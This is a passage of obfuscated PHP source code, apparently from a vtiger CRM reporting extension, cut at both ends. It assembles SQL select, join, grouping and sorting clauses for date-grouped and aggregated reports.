0;$Zf5<$ZZT1919;$Zf5++){if(!in_array($Zf5,$ZZZZZZZZZZE44)){$this->ZZZZZx23[$Zf5]->prefix = ($Zf5+1)."_".$this->ZZZZZx23[$Zf5]->name."_";if($this->isCombined){$this->ZZZZZx23[$Zf5]->ZZZZZZZZZZZZZZZZJ99= $this->ZZZZZZZZZZz25($this->ZZZZZx23[$Zf5])." ";if(in_array($this->ZZZZZx23[$Zf5]->name,$ZZZZZZZZZZF55)){$this->ZZZZZx23[$Zf5]->fieldTitlePrefix = "(".$this->ZZZZS1818->ZZZZZk10($this->ZZZZZx23[$Zf5]->name,$this->ZZZZZx23[$Zf5]->name).") ";}else{$this->ZZZZZx23[$Zf5]->fieldTitlePrefix = $this->ZZZZZZZZZZA00($this->ZZZZZx23[$Zf5]);}} $ZZZZZq16 = $this->ZZZZZx23[$Zf5]->ZZZZZZZZZZC22(true);$ZZS1818 = array_merge($ZZS1818,$ZZZZZq16);}} $ZZS1818[] = array("title"=>$this->ZZZZS1818->ZZZZZk10("Assigned To",$this->ZZZZZx23[1]->name), "fields"=>array(array("name"=>"00_ALL_assigned_user_id", "column"=>"assigned_user_id", "table"=>"vtiger_crmentity", "uitype"=>53, "type"=>"txt", "title"=>$this->ZZZZS1818->ZZZZZk10("Assigned To",$this->ZZZZZx23[1]->name), "bareTitle"=>$this->ZZZZS1818->ZZZZZk10("Assigned To",$this->ZZZZZx23[1]->name), "availableValues" =>array(),)));return $ZZS1818;}} class ZZZZZZZZZZG66{protected $ZZZZZZZZZZH77;protected $ZZZZZZZZZZI88;protected $ZZZZZZZZZZJ99;protected $ZZZZZZZZZZK1010 = 0;protected $ZZZZZZZZZZL1111 = false;protected $ZZZZZZZZZZM1212 = false;protected $ZZZZZZZZZZN1313 = array(array());protected $ZZZZZZZZZZO1414;protected $ZZZZZZZZZZP1515 = array();protected $ZZZZZZZZZZQ1616 = array();protected $ZZZZZZZZZZR1717 = array();protected $ZZZZZZZZZZS1818= array();protected $ZZZZZZZZZZT1919 = array();protected $ZZZZZZZZZZU2020 = array();protected $ZZZZZZZZZZV2121 = array();protected $ZZZZZZZZZZW2222 = array("day" => array("DATE"), "week" => array("WEEK"), "weekAndYear" => array("WEEK","YEAR"), "month" => array("MONTH"), "monthAndYear" => array("MONTH","YEAR"), "quarter" => array("QUARTER"), "quarterAndYear" => array("QUARTER","YEAR"), "year" => array("YEAR"),);protected $ZZZZZx23 = array();protected $db;protected $ZZZZS1818;function __construct(ZZp15 $db, ZZZZT1919 $ZZZZS1818, $ZZZZZZZZZZX2323 = false, ARUser $ZZZZZZZZZZJ99){$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;$this->ZZZZZZZZZZL1111 = $ZZZZZZZZZZX2323;$this->ZZZZZZZZZZJ99 = $ZZZZZZZZZZJ99;} function ZZZZZZZZZZY2424($field){$ZZS1818 = "";if(isset($field['related_module'])) {return array($field['related_module']);} return $ZZS1818;} function ZZZZZZZZZZZ2525($name,$ZZZZZZZZZZZa0){$ZZS1818 = false;$ZZT1919 = count($this->ZZZZZx23);if($ZZT1919>1){for($Zf5=1;$Zf5<$ZZT1919;$Zf5++){if($this->ZZZZZx23[$Zf5]->name == $name && $this->ZZZZZx23[$Zf5]->relationDescr->joinModule == $ZZZZZZZZZZZa0){$ZZS1818 = $Zf5;break;}}} return $ZZS1818;} function ZZZZZZZZZZZb1($field,$ZZZZZZZZZZZc2 = 0){$ZZZZZZZZZZZd3 = array();$moduleName = $this->ZZZZZZZZZZY2424($field);$ZZZZZZZZZZZe4 = "";$ZZT1919 = count($moduleName);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZf5 = $this->ZZZZZZZZZZZ2525($moduleName,$ZZZZZZZZZZZc2,$field);$ZZZZZZZZZZZg6 = $this->db->ZZZo14($moduleName[$Zf5],$field);if($ZZZZZZZZZZZf5 !==false && !($field["uitype"] == 66 && $moduleName[$Zf5]=="SalesOrder")) {if(!isset($this->ZZZZZZZZZZH77[$ZZZZZZZZZZZf5][$ZZZZZZZZZZZg6['field'][0]['tablename']])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$ZZZZZZZZZZZf5][$ZZZZZZZZZZZg6['field'][0]['tablename']],false,$ZZZZZZZZZZZf5);} $ZZZZZZZZZZZd3[] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZf5][$ZZZZZZZZZZZg6['field'][0]['tablename']].".`".$ZZZZZZZZZZZg6['field'][0]['columnname']."`";}else{$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]] = "t".$this->ZZZZZZZZZZK1010;$this->ZZZZZZZZZZK1010++;$this->ZZZZZZZZZZI88[] = "LEFT JOIN `".$ZZZZZZZZZZZg6['relation']["tablename"] ."` AS ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]] ." ON ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]].".`".$ZZZZZZZZZZZg6['relation']["entityidfield"] ."` = `".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']]."`.`".$field['columnname']."`";$ZZZZZZZZZZZi8 = array();foreach($ZZZZZZZZZZZg6['field'] as $ZZZZZZZZZZZj9){$ZZZZZZZZZZZi8[] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]].".`".$ZZZZZZZZZZZj9['rname']."`";} if(count($ZZZZZZZZZZZi8)>1){if($moduleName[$Zf5]=="Contacts"){global $AdvancedReporting_username_sequence;if($AdvancedReporting_username_sequence=='last-first'){$ZZZZZZZZZZZi8 = array_reverse($ZZZZZZZZZZZi8);}} $ZZZZZZZZZZZd3[] = " CONCAT(".implode(",' ',",$ZZZZZZZZZZZi8).") ";}else{$ZZZZZZZZZZZd3[] = $ZZZZZZZZZZZi8[0];}}} $ZZT1919 = count($ZZZZZZZZZZZd3);$ZZS1818 = "'-'";$ZZZZZZZZZZZe4.= " CASE ";for($Zf5 = $ZZT1919-1;$Zf5>-1;$Zf5--){$ZZS1818 = "IFNULL(".$ZZZZZZZZZZZd3[$Zf5].",".$ZZS1818.")";$ZZZZZZZZZZZe4.= "WHEN ".$ZZZZZZZZZZZd3[$Zf5]." IS NOT NULL THEN '".$moduleName[$Zf5]."' ";} $ZZS1818.=" AS `".$field['fieldname']."`";$ZZZZZZZZZZZe4.= "ELSE NULL END AS `".$field['fieldname']."_setype`";return $ZZS1818.", ".$ZZZZZZZZZZZe4;} function ZZZZZZZZZZZk10($field,$ZZZZZZZZZZZc2,$ZZZZZZZZZZZl11 = false){$ZZS1818 = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']].".`".$field['columnname'].'`';if(isset($field['aliasOnly']) && $field['aliasOnly'] === true){$ZZS1818 = $field['columnname'];if($ZZZZZZZZZZZl11){$ZZS1818 = preg_replace('/^ROUND\(/',"",$ZZS1818);$ZZS1818 = preg_replace('/\,2\)$/',"",$ZZS1818);}} $ZZS1818 = str_replace("#alias#",$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']],$ZZS1818);return $ZZS1818;} function ZZZZZZZZZZZm12($ZZZZZZZL1111) {$ZZZZZZZT1919 = PlatformConnector::ZZZZZZL1111($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZn13 = PlatformConnector::ZZZZZZN1313("UTC");$ZZZZZZZZZZZo14 = PlatformConnector::ZZZZZZN1313($ZZZZZZZT1919);return ZZZZZZZa0::ZZZZZZZZZz25($ZZZZZZZL1111, $ZZZZZZZZZZZn13, $ZZZZZZZZZZZo14);} function ZZZZZZZZZZZp15($name, $ZZZZZZZZZZZq16 = true, $ZZZZZZZZZZZr17 = "", $prefix = "") {if($ZZZZZZZZZZZq16) {return " AS `{$prefix}{$name}{$ZZZZZZZZZZZr17}` ";} return "";} function ZZZZZZZZZZZs18($field,$ZZZH77 = null,$displayOptions = null, $ZZZZZZZZZZZq16 = true, $ZZZZZZZZZZZt19 = array()){$ZZZZZZZZZZZu20 = false;if(!empty($ZZZZZZZZZZZt19) || (isset($field['tablename']) && $field['tablename'] == '__virtual__')){$ZZZZZZZZZZZu20 = true;} $ZZZZZZZZZZZv21 = PlatformConnector::ZZZZZZz25();$ZZS1818 = array();$ZZZZZZZZZZZw22 = '';$ZZZZZZZZZZZx23 = '';$ZZZZZZZZZZZy24 = array();$ZZZZZZZZZZZz25 = array();$ZZZZZZZZZZZc2 = $field['module'];if(!isset($this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']]) && !$ZZZZZZZZZZZu20){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$ZZZZZZZZZZZc2][$field['tablename']],false,$ZZZZZZZZZZZc2);} if(!$ZZZZZZZZZZZu20){$ZZZZZZZZZZZA00 = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']].".".$field['columnname']."";}else{$ZZZZZZZZZZZA00 = $field['columnname'];} if(!$ZZZH77){if($displayOptions){$ZZZz25 = "";switch($displayOptions){case "nogroup": $ZZZz25.="''";break;case "day": $ZZZz25.= ZZZZZZZa0::getDate($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZw22 = "_day";$ZZZZZZZZZZZx23 = " (Day)";break;case "week": $ZZZz25.= ZZZZZZZa0::ZZZZZZZZZo14($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZw22 = "_week";$ZZZZZZZZZZZx23 = " (Week)";break;case "weekAndYear": $ZZZZZZZZZZZB11 = ZZZZZZZa0::ZZZZZZZZZp15($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZC22 = ZZZZZZZa0::ZZZZZZZZZo14($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZz25.= ZZZZZZZa0::ZZZZZZZZZh7(array($ZZZZZZZZZZZB11, "'-'", $ZZZZZZZZZZZC22));$ZZZZZZZZZZZw22 = "_weekAndYear";$ZZZZZZZZZZZx23 = " (Week and year)";break;case "month": $ZZZz25.= ZZZZZZZa0::ZZZZZZZZZq16($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZw22 = "_month";$ZZZZZZZZZZZx23 = " (Month)";break;case "monthAndYear": $ZZZZZZZZZZZB11 = ZZZZZZZa0::ZZZZZZZZZp15($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZD33 = ZZZZZZZa0::ZZZZZZZZZq16($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZz25.= ZZZZZZZa0::ZZZZZZZZZh7(array($ZZZZZZZZZZZB11, "'-'", $ZZZZZZZZZZZD33));$ZZZZZZZZZZZw22 = "_monthAndYear";$ZZZZZZZZZZZx23 = " (Month and year)";break;case "quarter": $ZZZz25.= ZZZZZZZa0::ZZZZZZZZZr17($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZw22 = "_quarter";$ZZZZZZZZZZZx23 = " (Quarter)";break;case "quarterAndYear": $ZZZZZZZZZZZB11 = ZZZZZZZa0::ZZZZZZZZZp15($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZE44 = ZZZZZZZa0::ZZZZZZZZZr17($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZz25.= ZZZZZZZa0::ZZZZZZZZZh7(array($ZZZZZZZZZZZB11, "'-'", $ZZZZZZZZZZZE44));$ZZZZZZZZZZZw22 = "_quarterAndYear";$ZZZZZZZZZZZx23 = " (Quarter and year)";break;case "year": $ZZZz25.= ZZZZZZZa0::ZZZZZZZZZp15($this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00));$ZZZZZZZZZZZw22 = "_year";$ZZZZZZZZZZZx23 = " (Year)";break;default: $ZZZz25.= $ZZZZZZZZZZZA00;break;} $ZZZz25.= " AS `".$field['fieldname'].$ZZZZZZZZZZZw22."`";$ZZS1818[] = $ZZZz25;}else{if(($field['columnname']=="assigned_user_id" || $field['columnname']=="created_by" || $field['columnname']=="modified_user_id")){$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'] = "t".$this->ZZZZZZZZZZK1010;$this->ZZZZZZZZZZK1010++;$this->ZZZZZZZZZZI88[] = "LEFT JOIN users ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users']." ON ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".id = ".$ZZZZZZZZZZZA00;global $AdvancedReporting_username_sequence;$ZZS1818[] = "case when (".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".user_name not like \"\") then CONCAT(".($AdvancedReporting_username_sequence=='last-first'?$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".last_name,' ',".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".first_name":$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".first_name,' ',".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".last_name").") end AS `".$field['fieldname']."`";$ZZS1818[] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".`id` ". $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16, "_id");$ZZS1818[] = "'Users' ". $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16, "_setype");}else{if($this->ZZZZS1818->ZZZZZy24($field)){$ZZS1818[] = $this->ZZZZZZZZZZZb1($field,$ZZZZZZZZZZZc2);$ZZS1818[] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']].".`".$field['id_name']."` ". $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16, "_id");}else{if($this->ZZZZS1818->ZZZZZC22($field)) {$ZZZz25 = "ROUND(" . $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']] . ".`" . $field['columnname'] . "`,{$ZZZZZZZZZZZv21}) " . $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16);$ZZZz25 = str_replace("#alias#", $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']], $ZZZz25);$ZZS1818[] = $ZZZz25;} elseif($this->ZZZZS1818->ZZZZZD33($field)) {$ZZZz25 = $this->ZZZZZZZZZZZm12($ZZZZZZZZZZZA00) . $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16);$ZZS1818[] = $ZZZz25;}else{if(isset($field['aliasOnly']) && $field['aliasOnly'] === true){$ZZZz25 = str_replace('#alias#',$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']],$field['columnname']). $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16);} else {$ZZZz25 = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']].".`".$field['columnname']."` ". $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16);} $ZZS1818[] = $ZZZz25;if($this->ZZZZS1818->ZZZZZw22($field,$this->db,$this->ZZZZZx23)){$module = $this->ZZZZZx23[$ZZZZZZZZZZZc2];$ZZZZm12 = $module->ZZZZZZZZZZZF55();$ZZS1818[] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']].".`".$ZZZZm12['idCol']."` ". $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16, "_id");$ZZS1818[] = "'".$module->name."' ". $this->ZZZZZZZZZZZp15($field['fieldname'], $ZZZZZZZZZZZq16, "_setype");}}}}} $ZZZZZZZZZZZy24[] = $field['fieldname'].$ZZZZZZZZZZZw22;$ZZZZZZZZZZZz25[] = $this->ZZZZZZZZZZM1212[$ZZZZZZZZZZZc2].$field['fieldlabel'].$ZZZZZZZZZZZx23;}elseif(is_array($ZZZH77)){$ZZZZZZZZZZZv21 = PlatformConnector::ZZZZZZz25();if(!$ZZZZZZZZZZZu20) {if(isset($ZZZH77["sum"]) && $ZZZH77["sum"] == true){$ZZS1818[] = "ROUND(SUM(".$this->ZZZZZZZZZZZk10($field,$ZZZZZZZZZZZc2,true)."),{$ZZZZZZZZZZZv21}) " . $this->ZZZZZZZZZZZp15($field['fieldname'], true, "_sum");$ZZZZZZZZZZZy24[] = $field['fieldname']."_sum";$ZZZZZZZZZZZz25[] = $this->ZZZZZZZZZZM1212[$ZZZZZZZZZZZc2].$this->ZZZZS1818->ZZZZZk10('label_sum',"AnalyticReporting")."(".$field['fieldlabel'].")";} if(isset($ZZZH77["count"]) && $ZZZH77["count"] == true){$ZZS1818[] = "COUNT(".$this->ZZZZZZZZZZZk10($field,$ZZZZZZZZZZZc2,true).")" . $this->ZZZZZZZZZZZp15($field['fieldname'], true, "_cnt");$ZZZZZZZZZZZy24[] = $field['fieldname']."_cnt";$ZZZZZZZZZZZz25[] = $this->ZZZZZZZZZZM1212[$ZZZZZZZZZZZc2].$this->ZZZZS1818->ZZZZZk10('label_count',"AnalyticReporting")."(".$field['fieldlabel'].")";} if(isset($ZZZH77["avg"]) && $ZZZH77["avg"] == true){$ZZS1818[] = "ROUND(AVG(".$this->ZZZZZZZZZZZk10($field,$ZZZZZZZZZZZc2,true)."),{$ZZZZZZZZZZZv21})" . $this->ZZZZZZZZZZZp15($field['fieldname'], true, "_avg");$ZZZZZZZZZZZy24[] = $field['fieldname']."_avg";$ZZZZZZZZZZZz25[] = $this->ZZZZZZZZZZM1212[$ZZZZZZZZZZZc2].$this->ZZZZS1818->ZZZZZk10('label_average',"AnalyticReporting")."(".$field['fieldlabel'].")";}} else {if(isset($ZZZH77["sum"]) && $ZZZH77["sum"] == true){$ZZS1818[] = "ROUND(SUM(".$this->ZZZZZZZZZZZG66($ZZZZZZZZZZZt19["val"])."),{$ZZZZZZZZZZZv21})" . $this->ZZZZZZZZZZZp15($ZZZZZZZZZZZt19['name'], true, "_sum");$ZZZZZZZZZZZy24[] = $ZZZZZZZZZZZt19['name']."_sum";$ZZZZZZZZZZZz25[] = $this->ZZZZS1818->ZZZZZk10('label_sum',"AnalyticReporting")."(".$ZZZZZZZZZZZt19['title'].")";} if(isset($ZZZH77["count"]) && $ZZZH77["count"] == true){$ZZS1818[] = "COUNT(".$this->ZZZZZZZZZZZG66($ZZZZZZZZZZZt19["val"]).")" . $this->ZZZZZZZZZZZp15($ZZZZZZZZZZZt19['name'], true, "_cnt");$ZZZZZZZZZZZy24[] = $ZZZZZZZZZZZt19['name']."_cnt";$ZZZZZZZZZZZz25[] = $this->ZZZZS1818->ZZZZZk10('label_count',"AnalyticReporting")."(".$ZZZZZZZZZZZt19['title'].")";} if(isset($ZZZH77["avg"]) && $ZZZH77["avg"] == true){$ZZS1818[] = "ROUND(AVG(".$this->ZZZZZZZZZZZG66($ZZZZZZZZZZZt19["val"])."),{$ZZZZZZZZZZZv21})".$this->ZZZZZZZZZZZp15($ZZZZZZZZZZZt19['name'], true, "_avg");$ZZZZZZZZZZZy24[] = $ZZZZZZZZZZZt19['name']."_avg";$ZZZZZZZZZZZz25[] = $this->ZZZZS1818->ZZZZZk10('label_average',"AnalyticReporting")."(".$ZZZZZZZZZZZt19['title'].")";}}} return array("fields" =>$ZZZZZZZZZZZy24, "select"=>$ZZS1818,"titles"=>$ZZZZZZZZZZZz25);} function ZZZZZZZZZZZH77($field,$ZZZZZZZZZZZI88){$ZZZZZZZZZZZc2 = $field["module"];if(!isset($this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$ZZZZZZZZZZZc2][$field['tablename']],false,$ZZZZZZZZZZZc2);} if($ZZZZZZZZZZZI88["sortAction"] =="nogroup"){$ZZS1818 = null;}elseif(!empty($ZZZZZZZZZZZI88["dateGrouping"]) && isset($this->ZZZZZZZZZZW2222[$ZZZZZZZZZZZI88["dateGrouping"]])){$ZZZZZZZZZZZJ99 = $this->ZZZZZZZZZZW2222[$ZZZZZZZZZZZI88["dateGrouping"]];$ZZS1818 = array();foreach($ZZZZZZZZZZZJ99 as $ZZZZZZZV2121){$ZZS1818[] = $ZZZZZZZV2121."(".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']].".`".$field['columnname']."`)";} $ZZS1818 = implode(", ",$ZZS1818);}else{$ZZS1818 = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']].".`".$field['columnname']."`";} return $ZZS1818;} function ZZZZZZZZZZZK1010($field,$ZZZZZZZZZZZI88,$includeDetails = false){$fieldName = $field['fieldname'];if(!empty($ZZZZZZZZZZZI88["aggregate"])){$ZZZZZq16 = explode("_",$ZZZZZZZZZZZI88["aggregate"],2);if($ZZZZZq16[0] =="count"){$ZZZZZq16[0] = "cnt";} if(isset($this->ZZZZZZZZZZT1919[$ZZZZZq16[1]."_".$ZZZZZq16[0]])){$fieldName = $ZZZZZq16[1]."_".$ZZZZZq16[0];}}else{$ZZZZZZZZZZZI88["aggregate"] = null;} $ZZZZZZZZZZZc2 = $field["module"];if(!isset($this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$ZZZZZZZZZZZc2][$field['tablename']],false,$ZZZZZZZZZZZc2);} $ZZZZZZZM1212 = "ASC";if($ZZZZZZZZZZZI88["sortDirection"]=="DESC"){$ZZZZZZZM1212 = "DESC";} if(($field['uitype'] == 'enum') && ($ZZZZZZZZZZZI88['name'] == $ZZZZZZZZZZZI88['aggregate'])){$ZZZZZZZZZZZL1111 = $field['fieldname_org'];$moduleName = $this->ZZZZZx23[$field["module"]]->name;$ZZZZZZZO1414 = $this->db->ZZN1313($ZZZZZZZZZZZL1111, $moduleName);$ZZZZZZZO1414 = array_keys($ZZZZZZZO1414);foreach ($ZZZZZZZO1414 as &$ZZZZZZZP1515) {$ZZZZZZZP1515 = "'{$ZZZZZZZP1515}'";} $ZZZZZZZO1414 = implode(",", $ZZZZZZZO1414);$ZZS1818 = "FIELD({$fieldName}, {$ZZZZZZZO1414}) {$ZZZZZZZM1212}";return $ZZS1818;} if(!empty($ZZZZZZZZZZZI88["dateGrouping"]) && ($ZZZZZZZZZZZI88["aggregate"] == $field['fieldname'] || $includeDetails ||!$ZZZZZZZZZZZI88["aggregate"])){if($includeDetails){switch($ZZZZZZZZZZZI88["dateGrouping"]) {case 'year': $ZZS1818 = "`".$fieldName."_year` $ZZZZZZZM1212";break;case 'quarterAndYear': $ZZS1818 = "LEFT(`".$fieldName."_quarterAndYear`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_quarterAndYear`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'quarter': $ZZS1818 = "LEFT(`".$fieldName."_quarter`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_quarter`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'monthAndYear': $ZZS1818 = "LEFT(`".$fieldName."_monthAndYear`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_monthAndYear`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'month': $ZZS1818 = "`".$fieldName."_month` $ZZZZZZZM1212";break;case 'weekAndYear': $ZZS1818 = "LEFT(`".$fieldName."_weekAndYear`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_weekAndYear`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'week': $ZZS1818 = "`".$fieldName."_week` $ZZZZZZZM1212";break;case 'day': $ZZS1818 = "LEFT(`".$fieldName."_day`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_day`,6,2) AS UNSIGNED) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_day`,9,2) AS UNSIGNED) $ZZZZZZZM1212";break;default: $ZZS1818 = "LEFT(`$fieldName`,4) $ZZZZZZZM1212, CAST(MID(`$fieldName`,6,2) AS UNSIGNED) $ZZZZZZZM1212 , CAST(MID(`$fieldName`,9,2) AS UNSIGNED) $ZZZZZZZM1212";break;}}else{switch($ZZZZZZZZZZZI88["dateGrouping"]) {case 'year': $ZZS1818 = "`".$fieldName."_year` $ZZZZZZZM1212";break;case 'quarterAndYear': $ZZS1818 = "LEFT(`".$fieldName."_quarterAndYear`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_quarterAndYear`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'quarter': $ZZS1818 = "LEFT(`".$fieldName."_quarter`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_quarter`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'monthAndYear': $ZZS1818 = "LEFT(`".$fieldName."_monthAndYear`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_monthAndYear`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'month': $ZZS1818 = "`".$fieldName."_month` $ZZZZZZZM1212";break;case 'weekAndYear': $ZZS1818 = "LEFT(`".$fieldName."_weekAndYear`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_weekAndYear`,6,2) AS UNSIGNED) $ZZZZZZZM1212";break;case 'week': $ZZS1818 = "`".$fieldName."_week` $ZZZZZZZM1212";break;case 'day': $ZZS1818 = "LEFT(`".$fieldName."_day`,4) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_day`,6,2) AS UNSIGNED) $ZZZZZZZM1212, CAST(MID(`".$fieldName."_day`,9,2) AS UNSIGNED) $ZZZZZZZM1212";break;default: $ZZS1818 = "LEFT(`$fieldName`,4) $ZZZZZZZM1212, CAST(MID(`$fieldName`,6,2) AS UNSIGNED) $ZZZZZZZM1212, CAST(MID(`$fieldName`,9,2) AS UNSIGNED) $ZZZZZZZM1212";break;}}}else{$ZZS1818 = "`".$fieldName."` ".$ZZZZZZZM1212;} return $ZZS1818;} function ZZZZZZZZZZZM1212($ZZZZm12,$ZZZZZZZZZZZN1313,$ZZZZZZZZZZZc2 = 0, $ZZZZZt19=null,$type = "INNER",$ZZZZZZZZZZZO1414=null, $ZZZZZZZZZZZP1515=0){$ZZZZZZZZZZZQ1616 = $this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr;if(!$ZZZZZt19){$ZZZZZt19 = $ZZZZZZZZZZZN1313['idCol'];} if(!$ZZZZZZZZZZZO1414){$ZZZZZZZZZZZO1414 = $ZZZZm12['idCol'];} $ZZZZZZZZZZZR1717 = strpos($ZZZZm12['name'], "_cstm");$ZZZZZZZZZZZS1818 = strpos($ZZZZZZZZZZZN1313['name'], "_cstm");if($ZZZZZZZZZZZR1717 !== false || $ZZZZZZZZZZZS1818 !== false){$ZZZZZZZZZZZQ1616 = false;} if($ZZZZZZZZZZZQ1616 && $ZZZZZZZZZZZQ1616->joinType == 'many') {$ZZZZZZZZZZZT1919 = 't'.$this->ZZZZZZZZZZK1010.'_'.$ZZZZZZZZZZZQ1616->manyToManyTable;$this->ZZZZZZZZZZK1010++;$ZZS1818 = $type." JOIN `".$ZZZZZZZZZZZQ1616->manyToManyTable ."` AS `".$ZZZZZZZZZZZT1919 ."` ON (`".$ZZZZZZZZZZZT1919."`.`".$ZZZZZZZZZZZQ1616->sourceIndex ."` = `".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZP1515][$ZZZZZZZZZZZN1313['name']]."`.`".$ZZZZZt19."`";if($ZZZZZZZZZZZQ1616->roleIndex) {$ZZS1818.= " AND `".$ZZZZZZZZZZZT1919."`.`".$ZZZZZZZZZZZQ1616->roleIndex."` = '".$ZZZZZZZZZZZQ1616->roleValue."' ";} $ZZS1818.= " AND `".$ZZZZZZZZZZZT1919."`.`deleted` = '0' ";$ZZS1818.= ") ";$ZZS1818.= $type." JOIN `".$ZZZZm12["name"] ."` AS `".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']] ."` ON (`".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']]."`.`".$ZZZZZZZZZZZO1414 ."` = `".$ZZZZZZZZZZZT1919."`.`".$ZZZZZZZZZZZQ1616->targetIndex."`";$ZZS1818.= ") ";} else {if($ZZZZm12["name"] =="vtiger_inventoryproductrel"){$ZZS1818 = $type." JOIN `".$ZZZZm12["name"] ."` AS `".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']] ."` ON (`".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']]."`.`".$ZZZZZZZZZZZO1414 ."` = `".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZP1515][$ZZZZZZZZZZZN1313['name']]."`.`".$ZZZZZt19."`";$ZZS1818.= ") ";}else{$ZZS1818 = $type." JOIN `".$ZZZZm12["name"] ."` AS ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']] ." ON ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']].".`".$ZZZZZZZZZZZO1414 ."` = `".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZP1515][$ZZZZZZZZZZZN1313['name']]."`.`".$ZZZZZt19."`";}} return $ZZS1818;} function ZZZZZZZZZZZh7($ZZZZm12,$ZZZZZZZZZZZU2020 = 